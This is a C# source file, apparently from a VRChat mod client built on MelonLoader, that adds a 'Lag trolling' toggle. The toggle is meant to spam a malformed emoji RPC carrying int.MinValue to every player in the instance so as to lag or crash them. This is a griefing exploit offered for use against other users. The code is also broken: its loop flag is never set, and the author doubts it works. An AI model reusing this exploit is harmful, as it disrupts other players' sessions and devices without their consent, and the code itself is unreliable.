using System;
using System.Collections;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MelonLoader;
using Photon.Realtime;
using UnityEngine;
using VRC.SDKBase;
using Photon.Pun;
using Object = Il2CppSystem.Object;
using ExitGames.Client.Photon;
using UnhollowerBaseLib;
using Il2CppSystem.IO;


namespace Basic_Client.Functions
{
    public class Crash
    {
        public static bool on = false;
        public static void StartUI(QMNestedButton location)
        {
            var Crashing = new QMNestedButton(location, "Lag trolling", 2, 0, "Crashing Options", "Crashing Options");
            new QMToggleButton(Crashing, 1, 0, "Lag people", delegate
            {
                MelonCoroutines.Start(Desync());
            }, delegate
            {
                
            }, "Slightly Lower peoples frames I dont think this even works");
        }
        
        static IEnumerator Desync()
        {
            while (on)
            {
                for (int i = 0; i < 3; i++)
                {
                    Networking.RPC(RPC.Destination.All, PlayerManager.PlayerHandler.LocalPlayer().gameObject, "SpawnEmojiRPC", new Il2CppSystem.Object[]
                    {
                        new Il2CppSystem.Int32
                        {
                            m_value = int.MinValue
                        }.BoxIl2CppObject()
                    });
                    if (!on)
                        break;
                }
                yield return new WaitForSecondsRealtime(0.15f);
            }
            yield break;
        }


    }
}

